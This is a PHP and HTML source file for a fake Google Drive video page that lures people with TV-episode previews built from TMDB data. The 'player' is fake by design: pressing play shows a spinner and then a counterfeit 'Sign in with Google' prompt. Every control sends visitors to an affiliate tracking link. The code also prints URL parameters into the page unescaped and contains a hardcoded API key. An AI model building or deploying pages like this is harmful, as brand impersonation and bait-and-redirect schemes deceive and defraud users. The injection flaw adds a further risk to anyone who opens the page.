<?php
// --- LOGIKA SERVER SIDE UNTUK OPEN GRAPH (OG) ---
$API_KEY = "22be462e6d3de1dbab03d1ca50847b5a";
$tvID = isset($_GET['id']) ? $_GET['id'] : '1396'; // Default Breaking Bad
$sNum = isset($_GET['s']) ? $_GET['s'] : '1';
$eNum = isset($_GET['e']) ? $_GET['e'] : '1';

// 1. Ambil Data TV dari API (Server-side)
$tv_data = json_decode(file_get_contents("https://api.themoviedb.org/3/tv/$tvID?api_key=$API_KEY"), true);
$show_name = $tv_data['name'] ?? 'Video Access';

// 2. Ambil Data Episode untuk Backdrop Asli
$ep_data = json_decode(file_get_contents("https://api.themoviedb.org/3/tv/$tvID/season/$sNum?api_key=$API_KEY"), true);
$active_ep = null;
if (isset($ep_data['episodes'])) {
    foreach ($ep_data['episodes'] as $ep) {
        if ($ep['episode_number'] == $eNum) {
            $active_ep = $ep;
            break;
        }
    }
}

// 3. Tentukan Gambar dan Judul untuk OG
$backdrop_path = $active_ep['still_path'] ?? $tv_data['backdrop_path'];
$final_og_image = "https://image.tmdb.org/t/p/w1280" . $backdrop_path;
$final_og_title = "[DIRECT ACCESS] " . $show_name . " S" . $sNum . " E" . $eNum . " - Watch Full HD";
$final_og_desc = "Streaming now: " . ($active_ep['name'] ?? 'Private Content') . ". Identity verification required for 1080p access.";
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    
    <title id="page-title">Google Drive: <?php echo $show_name; ?> S<?php echo $sNum; ?> E<?php echo $eNum; ?></title>
    
    <meta property="og:site_name" content="FILE-TV.RF.GD">
    <meta property="og:title" content="<?php echo $final_og_title; ?>">
    <meta property="og:description" content="<?php echo $final_og_desc; ?>">
    <meta property="og:image" content="<?php echo $final_og_image; ?>">
    <meta property="og:image:width" content="1280">
    <meta property="og:image:height" content="720">
    <meta property="og:type" content="video.other">

    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="<?php echo $final_og_title; ?>">
    <meta name="twitter:image" content="<?php echo $final_og_image; ?>">

    <link rel="icon" type="image/png" href="https://www.gstatic.com/images/branding/product/1x/drive_2020q4_32dp.png">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">

    <style>
        :root {
            --drive-bg: #0d0d0d; 
            --header-bg: #1a1b1c; 
            --google-blue: #8ab4f8; 
            --btn-blue: #1a73e8;
            --gray-text: #9aa0a6;
            --folder-bg: #1e1f21;
            --border: #3c4043;
            --text-main: #e8eaed;
            --card-shadow: rgba(0,0,0,0.5);
        }

        [data-theme="light"] {
            --drive-bg: #f8f9fa;
            --header-bg: #ffffff; 
            --google-blue: #1a73e8; 
            --btn-blue: #1a73e8;
            --gray-text: #5f6368;
            --folder-bg: #ffffff;
            --border: #dadce0;
            --text-main: #3c4043;
            --card-shadow: rgba(0,0,0,0.1);
        }
        
        * { margin:0; padding:0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; transition: background 0.3s, color 0.3s; }
        body { background: var(--drive-bg); color: var(--text-main); font-family: 'Roboto', sans-serif; overflow-y: auto; min-height: 100vh; }

        .g-header { 
            position: fixed; top: 0; width: 100%; height: 64px; 
            background: var(--header-bg); display: flex; align-items: center; 
            padding: 0 16px; z-index: 2000; border-bottom: 1px solid var(--border);
        }
        .h-left { display: flex; align-items: center; gap: 12px; flex: 1; min-width: 0; }
        .file-name { font-size: 17px; font-weight: 400; color: var(--text-main); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
        .h-right { display: flex; align-items: center; gap: 8px; }
        .h-icon { width: 40px; height: 40px; display: flex; align-items: center; justify-content: center; color: var(--gray-text); font-size: 18px; cursor: pointer; border-radius: 50%; }
        .h-icon:hover { background: rgba(128,128,128,0.1); }

        .main-container { padding-top: 85px; display: flex; flex-direction: column; align-items: center; }
        .player-wrapper { 
            width: 94%; max-width: 900px; aspect-ratio: 16/9; background: #000; 
            border-radius: 12px; position: relative; overflow: hidden; cursor: pointer; 
            box-shadow: 0 10px 30px var(--card-shadow); margin-bottom: 25px; 
        }
        #backdrop { 
            position: absolute; inset: 0; 
            background-size: cover; 
            background-position: center; 
            opacity: 0.6;
            background-image: url('<?php echo $final_og_image; ?>');
        }
        .overlay { position: absolute; inset: 0; display: flex; align-items: center; justify-content: center; z-index: 10; }
        .play-btn { width: 70px; height: 70px; background: rgba(255,255,255,0.9); border-radius: 50%; display: flex; align-items: center; justify-content: center; box-shadow: 0 4px 15px rgba(0,0,0,0.3); }
        .play-btn i { color: #202124; font-size: 26px; margin-left: 5px; }
        .spinner { display: none; width: 55px; height: 55px; border: 4px solid rgba(255,255,255,0.3); border-top-color: #fff; border-radius: 50%; animation: spin 1s linear infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }

        .player-controls { position: absolute; bottom: 0; width: 100%; height: 48px; background: linear-gradient(transparent, rgba(0,0,0,0.85)); display: flex; align-items: center; padding: 0 15px; gap: 15px; z-index: 15; }
        .progress-bar { position: absolute; top: 0; left: 0; right: 0; height: 3px; background: rgba(255,255,255,0.3); }
        .time-display { font-size: 13px; color: #fff; flex: 1; }
        .c-icon { font-size: 15px; color: #fff; opacity: 0.9; cursor: pointer; }

        .list-section { width: 92%; max-width: 900px; }
        .section-header { font-size: 11px; color: var(--gray-text); margin: 20px 0 8px; font-weight: 500; text-transform: uppercase; letter-spacing: 1px; }
        .folder-box { background: var(--folder-bg); padding: 15px 18px; border-radius: 10px; border: 1px solid var(--border); display: flex; align-items: center; justify-content: space-between; cursor: pointer; margin-bottom: 12px; }
        .folder-content { display: flex; align-items: center; gap: 15px; }
        .folder-content i.fa-folder { color: #fabb05; font-size: 22px; }
        .folder-content i.fa-file-video { color: #ea4335; font-size: 20px; }
        .folder-content span { font-weight: 500; font-size: 14px; }

        .dropdown-list { display: none; background: var(--folder-bg); border: 1px solid var(--border); border-radius: 10px; margin-top: -8px; margin-bottom: 20px; overflow-y: auto; max-height: 280px; box-shadow: 0 5px 15px var(--card-shadow); }
        .item-opt { display: flex; align-items: center; gap: 12px; padding: 14px 18px; text-decoration: none; color: var(--text-main); border-bottom: 1px solid var(--border); font-size: 14px; }
        .item-opt.active { color: var(--google-blue); font-weight: 500; background: rgba(26, 115, 232, 0.1); }

        .theme-fab {
            position: fixed; bottom: 25px; right: 25px; z-index: 3000;
            width: 50px; height: 50px; background: var(--header-bg); 
            border-radius: 50%; border: 1px solid var(--border);
            display: flex; align-items: center; justify-content: center;
            box-shadow: 0 4px 12px rgba(0,0,0,0.2);
            cursor: pointer; color: var(--google-blue); font-size: 18px;
        }

        footer { margin-top: 50px; padding: 40px 20px; text-align: center; border-top: 1px solid var(--border); }
        .footer-icons { display: flex; justify-content: center; gap: 20px; margin-bottom: 15px; opacity: 0.5; }
        .footer-text { font-size: 12px; color: var(--gray-text); line-height: 1.6; max-width: 500px; margin: 0 auto; }
        .footer-links { margin-top: 15px; display: flex; justify-content: center; gap: 15px; font-size: 11px; font-weight: 500; }
        .footer-links a { color: var(--gray-text); text-decoration: none; }

        .modal-overlay { display: none; position: fixed; inset: 0; background: rgba(0, 0, 0, 0.75); z-index: 9999; align-items: center; justify-content: center; backdrop-filter: blur(5px); }
        .google-card { background: #fff; width: 92%; max-width: 420px; padding: 45px 35px; border-radius: 8px; text-align: center; color: #202124; position: relative; }
        .close-modal { position: absolute; top: 15px; right: 15px; font-size: 18px; color: #5f6368; cursor: pointer; }
        .next-btn { background: #1a73e8; color: #fff; padding: 10px 26px; border-radius: 4px; border: none; font-size: 14px; font-weight: 500; cursor: pointer; margin-top: 30px; }
    </style>
</head>
<body data-theme="dark">

<nav class="g-header">
    <div class="h-left">
        <div class="h-icon" onclick="history.back()"><i class="fas fa-arrow-left"></i></div>
        <div class="file-name" id="h-title"><?php echo str_replace(' ', '_', $show_name); ?>_S<?php echo sprintf("%02d", $sNum); ?>_E<?php echo sprintf("%02d", $eNum); ?>.mp4</div>
    </div>
    <div class="h-right">
        <div class="h-icon" onclick="showLogin()"><i class="fas fa-download"></i></div>
        <div class="h-icon" onclick="showLogin()"><i class="fas fa-user-circle"></i></div>
    </div>
</nav>

<div class="main-container">
    <div class="player-wrapper" onclick="startFakePlayer()">
        <div id="backdrop"></div>
        <div class="overlay">
            <div class="play-btn" id="play-ui"><i class="fas fa-play"></i></div>
            <div class="spinner" id="spinner-ui"></div>
        </div>
        <div class="player-controls">
            <div class="progress-bar"></div>
            <div class="time-display"><i class="fas fa-play" style="font-size: 12px; margin-right: 15px;"></i> 0:00 / <span id="runtime-display"><?php echo $active_ep['runtime'] ?? '45'; ?>:00</span></div>
            <div class="ctrl-right" style="display:flex; gap:15px">
                <i class="fas fa-closed-captioning c-icon"></i>
                <i class="fas fa-cog c-icon"></i>
                <i class="fas fa-expand c-icon"></i>
            </div>
        </div>
    </div>

    <div class="list-section">
        <div class="section-header">Select Season</div>
        <div class="folder-box" onclick="toggleDD('s-dropdown', 's-icon')">
            <div class="folder-content">
                <i class="fas fa-folder"></i>
                <span id="selected-season-text">Season <?php echo $sNum; ?></span>
            </div>
            <i class="fas fa-chevron-down" id="s-icon" style="transition:0.3s; font-size:12px; color:var(--gray-text)"></i>
        </div>
        <div class="dropdown-list" id="s-dropdown">
            <?php 
            for($i=1; $i<=$tv_data['number_of_seasons']; $i++) {
                $active = ($i == $sNum) ? 'active' : '';
                echo "<a href='?id=$tvID&s=$i&e=1' class='item-opt $active'>Season $i</a>";
            }
            ?>
        </div>

        <div class="section-header">Select Episode</div>
        <div class="folder-box" onclick="toggleDD('e-dropdown', 'e-icon')">
            <div class="folder-content">
                <i class="fas fa-file-video"></i>
                <span id="selected-episode-text">E<?php echo $eNum; ?> - <?php echo $active_ep['name'] ?? 'Episode'; ?></span>
            </div>
            <i class="fas fa-chevron-down" id="e-icon" style="transition:0.3s; font-size:12px; color:var(--gray-text)"></i>
        </div>
        <div class="dropdown-list" id="e-dropdown">
            <?php 
            if (isset($ep_data['episodes'])) {
                foreach ($ep_data['episodes'] as $ep) {
                    $active = ($ep['episode_number'] == $eNum) ? 'active' : '';
                    echo "<a href='?id=$tvID&s=$sNum&e=".$ep['episode_number']."' class='item-opt $active'>
                            <i class='fas fa-play-circle' style='font-size:14px; opacity:0.6'></i>
                            E".$ep['episode_number']." - ".$ep['name']."
                          </a>";
                }
            }
            ?>
        </div>
    </div>
</div>

<footer>
    <div class="footer-icons">
        <img src="https://www.gstatic.com/images/branding/product/2x/drive_2020q4_96dp.png" width="22" style="filter: grayscale(100%);">
        <i class="fas fa-shield-alt"></i>
        <i class="fas fa-lock"></i>
    </div>
    <p class="footer-text">
        Â© 2026 Google Drive Storage System. All rights reserved.<br>
        <span style="color: var(--google-blue); font-weight: 500;">Encrypted Connection (AES-256).</span> This content is protected by international copyright laws. Unauthorized access is strictly prohibited.
    </p>
    <div class="footer-links">
        <a href="#" onclick="showLogin()">Privacy Policy</a>
        <a href="#" onclick="showLogin()">Terms of Service</a>
        <a href="#" onclick="showLogin()">Help Center</a>
    </div>
</footer>

<div class="theme-fab" id="themeBtn" onclick="toggleTheme()">
    <i class="fas fa-sun" id="themeIcon"></i>
</div>

<div class="modal-overlay" id="loginModal">
    <div class="google-card">
        <div class="close-modal" onclick="closeLogin()"><i class="fas fa-times"></i></div>
        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="75" style="margin-bottom:15px">
        <h1 style="font-size:24px; font-weight:400; margin-bottom:8px">Sign in</h1>
        <p style="font-size:16px; margin-bottom:30px; color: #5f6368;">to continue to Google Drive</p>
        <div style="display:flex; align-items:center; padding:12px; border:1px solid #dadce0; border-radius:4px; text-align:left; cursor:pointer" onclick="goToLink()">
            <i class="fas fa-user-circle" style="font-size:22px; color:#5f6368; margin-right:12px"></i>
            <span style="font-size:14px; font-weight:500; color:#3c4043; flex:1">Sign in with Google</span>
        </div>
        <button class="next-btn" onclick="goToLink()">Next</button>
    </div>
</div>

<script>
    function toggleTheme() {
        const body = document.body;
        const icon = document.getElementById('themeIcon');
        if(body.getAttribute('data-theme') === 'dark') {
            body.setAttribute('data-theme', 'light');
            icon.className = 'fas fa-moon';
        } else {
            body.setAttribute('data-theme', 'dark');
            icon.className = 'fas fa-sun';
        }
    }

    function toggleDD(id, iconId) {
        const dd = document.getElementById(id);
        const icon = document.getElementById(iconId);
        const isOpen = dd.style.display === 'block';
        document.querySelectorAll('.dropdown-list').forEach(el => el.style.display = 'none');
        document.querySelectorAll('.fa-chevron-down').forEach(el => el.style.transform = 'rotate(0deg)');
        dd.style.display = isOpen ? 'none' : 'block';
        icon.style.transform = isOpen ? 'rotate(0deg)' : 'rotate(180deg)';
    }

    function startFakePlayer() {
        const playBtn = document.getElementById('play-ui');
        const spinner = document.getElementById('spinner-ui');
        playBtn.style.display = 'none'; spinner.style.display = 'block';
        setTimeout(() => {
            spinner.style.display = 'none'; playBtn.style.display = 'flex';
            showLogin();
        }, 1200);
    }

    function showLogin() { document.getElementById('loginModal').style.display = 'flex'; }
    function closeLogin() { document.getElementById('loginModal').style.display = 'none'; }
    function goToLink() { window.location.href = "https://playfloowz.com/c?a=275&o=19&sub2=tv_preview"; }
</script>
</body>
</html>
